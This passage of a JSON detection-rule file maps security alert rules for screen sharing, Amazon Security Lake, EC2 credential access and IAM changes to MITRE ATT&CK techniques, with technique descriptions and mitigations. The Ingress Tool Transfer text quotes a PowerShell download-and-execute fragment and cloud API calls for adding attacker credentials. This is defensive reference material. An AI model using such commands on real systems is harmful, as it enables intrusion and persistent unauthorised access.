            "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise."
        ],
        "mitigation_strategies": [
            "Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 89607,
        "rule_description": "Attempt to connect to screen sharing with username $(dstuser) from $(ip_address) succeeded.",
        "mitre_id": [
            "T1021",
            "T1078"
        ],
        "possible_attacks": [
            "Remote Services",
            "Valid Accounts"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP). They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools]( and other administrative programs) may utilize [Remote Services]( to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC]( to send the screen and control buffers and [SSH]( for secure file transfer. Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.",
            "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise."
        ],
        "mitigation_strategies": [
            "Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 99001,
        "rule_description": "Amazon Security Lake - CloudTrail rules grouped.",
        "mitre_id": [
            "T1048.001"
        ],
        "possible_attacks": [
            "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
        ],
        "description": [
            "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). "
        ],
        "mitigation_strategies": [
            "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network."
        ]
    },
    {
        "rule_id": 99002,
        "rule_description": "Amazon Security Lake - Amazon VPC rules grouped.",
        "mitre_id": [
            "T1048.001"
        ],
        "possible_attacks": [
            "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
        ],
        "description": [
            "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). "
        ],
        "mitigation_strategies": [
            "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network."
        ]
    },
    {
        "rule_id": 99003,
        "rule_description": "Amazon Security Lake - Route 53 rules grouped.",
        "mitre_id": [
            "T1048.001"
        ],
        "possible_attacks": [
            "Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
        ],
        "description": [
            "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). "
        ],
        "mitigation_strategies": [
            "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network."
        ]
    },
    {
        "rule_id": 99020,
        "rule_description": "Amazon Security Lake - CloudTrail - Failed API Operation \"$(api.operation)\" with error \"$(api.response.error)\" from $(src_endpoint.ip) by user $(identity.user.name).",
        "mitre_id": [
            "T1098.003",
            "T1078.004"
        ],
        "possible_attacks": [
            "Additional Cloud Roles",
            "Cloud Accounts"
        ],
        "description": [
            "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow [Create Account]( or other malicious account activity. Adversaries may also modify existing [Valid Accounts]( that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account]( or modify a victim-owned account.",
            "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through [Brute Force]( [Phishing]( or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services]( High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools]( to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials]( on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access]( or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API]( or other methods. \n"
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 99021,
        "rule_description": "Amazon Security Lake - CloudTrail - Too many failed API Operations \"$(api.response.error)\" from $(src_endpoint.ip) ip.",
        "mitre_id": [
            "T1098.003",
            "T1078.004"
        ],
        "possible_attacks": [
            "Additional Cloud Roles",
            "Cloud Accounts"
        ],
        "description": [
            "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow [Create Account]( or other malicious account activity. Adversaries may also modify existing [Valid Accounts]( that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account]( or modify a victim-owned account.",
            "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through [Brute Force]( [Phishing]( or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services]( High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools]( to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials]( on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access]( or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API]( or other methods. \n"
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 99022,
        "rule_description": "Amazon Security Lake - CloudTrail - Successful API Operation \"$(api.operation)\" by user $(identity.user.name) from $(src_endpoint.ip) ip.",
        "mitre_id": [
            "T1098.003",
            "T1078.004"
        ],
        "possible_attacks": [
            "Additional Cloud Roles",
            "Cloud Accounts"
        ],
        "description": [
            "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow [Create Account]( or other malicious account activity. Adversaries may also modify existing [Valid Accounts]( that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account]( or modify a victim-owned account.",
            "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through [Brute Force]( [Phishing]( or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services]( High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools]( to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials]( on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access]( or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API]( or other methods. \n"
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 99023,
        "rule_description": "Amazon Security Lake - CloudTrail - Successful API Operation \"$(api.operation)\".",
        "mitre_id": [
            "T1098.003",
            "T1078.004"
        ],
        "possible_attacks": [
            "Additional Cloud Roles",
            "Cloud Accounts"
        ],
        "description": [
            "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow [Create Account]( or other malicious account activity. Adversaries may also modify existing [Valid Accounts]( that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account]( or modify a victim-owned account.",
            "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through [Brute Force]( [Phishing]( or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services]( High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools]( to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials]( on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access]( or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API]( or other methods. \n"
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 99024,
        "rule_description": "Amazon Security Lake - CloudTrail - Successful API Operation \"$(api.operation)\" from $(src_endpoint.ip) ip.",
        "mitre_id": [
            "T1098.003",
            "T1078.004"
        ],
        "possible_attacks": [
            "Additional Cloud Roles",
            "Cloud Accounts"
        ],
        "description": [
            "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow [Create Account]( or other malicious account activity. Adversaries may also modify existing [Valid Accounts]( that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account]( or modify a victim-owned account.",
            "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through [Brute Force]( [Phishing]( or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services]( High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools]( to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials]( on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access]( or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API]( or other methods. \n"
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 99025,
        "rule_description": "Amazon Security Lake - CloudTrail - Successful API Operation \"$(api.operation)\" by user $(identity.user.name).",
        "mitre_id": [
            "T1098.003",
            "T1078.004"
        ],
        "possible_attacks": [
            "Additional Cloud Roles",
            "Cloud Accounts"
        ],
        "description": [
            "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).\n \n\nThis account modification may immediately follow [Create Account]( or other malicious account activity. Adversaries may also modify existing [Valid Accounts]( that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account]( or modify a victim-owned account.",
            "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \n\nService or user accounts may be targeted by adversaries through [Brute Force]( [Phishing]( or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services]( High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools]( to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials]( on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access]( or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API]( or other methods. \n"
        ],
        "mitigation_strategies": [
            "Ensure that low-privileged user accounts do not have permissions to add permissions to accounts or update IAM policies.",
            "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
        ]
    },
    {
        "rule_id": 99026,
        "rule_description": "Credentials access: Attempt to retrieve EC2 credentials.",
        "mitre_id": [
            "T1530"
        ],
        "possible_attacks": [
            "Data from Cloud Storage"
        ],
        "description": [
            "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API]( In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories]( \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
        ],
        "mitigation_strategies": [
            "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
        ]
    },
    {
        "rule_id": 99027,
        "rule_description": "Credentials access: Multiple attempts to retrieve EC2 credentials.",
        "mitre_id": [
            "T1530"
        ],
        "possible_attacks": [
            "Data from Cloud Storage"
        ],
        "description": [
            "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API]( In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories]( \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects."
        ],
        "mitigation_strategies": [
            "Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary."
        ]
    },
    {
        "rule_id": 99028,
        "rule_description": "Security group with inbound rules allowing \"Unknown cidrIp\" on port \"Unknown port\" detected.",
        "mitre_id": [
            "T1562.007",
            "T1105",
            "T1041"
        ],
        "possible_attacks": [
            "Disable or Modify Cloud Firewall",
            "Ingress Tool Transfer",
            "Exfiltration Over C2 Channel"
        ],
        "description": [
            "Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall]( \n\nCloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups (or creates new security groups entirely) to allow any TCP/IP connectivity to a cloud-hosted instance. They may also remove networking limitations to support traffic associated with malicious activity (such as cryptomining).\n\nModifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. It may also be used to open up resources for [Brute Force]( or [Endpoint Denial of Service]( ",
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
            "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications."
        ],
        "mitigation_strategies": [
            "Ensure least privilege principles are applied to Identity and Access Management (IAM) security policies.",
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.",
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. "
        ]
    },
    {
        "rule_id": 99029,
        "rule_description": "Possible IAM Role backdooring: IAM role granted from an external account.",
        "mitre_id": [
            "T1098.001"
        ],
        "possible_attacks": [
            "Additional Cloud Credentials"
        ],
        "description": [
            "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts]( adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for [Cloud Service Dashboard]( If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. [Cloud Accounts]( For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal\u2019s roles and permissions, which may be different from those of the Application Administrator. \n\nIn AWS environments, adversaries with the appropriate permissions may also use the `sts:GetFederationToken` API call to create a temporary set of credentials to [Forge Web Credentials]( tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account\u2019s API credentials are 